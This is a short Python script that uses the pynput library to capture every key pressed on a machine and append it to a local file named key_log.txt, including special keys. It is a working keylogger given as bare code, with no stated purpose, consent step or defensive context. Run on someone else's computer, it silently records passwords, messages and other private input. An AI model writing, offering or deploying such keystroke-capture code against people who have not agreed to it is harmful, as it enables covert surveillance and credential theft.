from pynput import keyboard

# Specify the log file where keystrokes will be recorded
log_file = "key_log.txt"

# Define the function to handle key press events
def on_press(key):
    try:
        # Record alphanumeric keys
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Record special keys
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
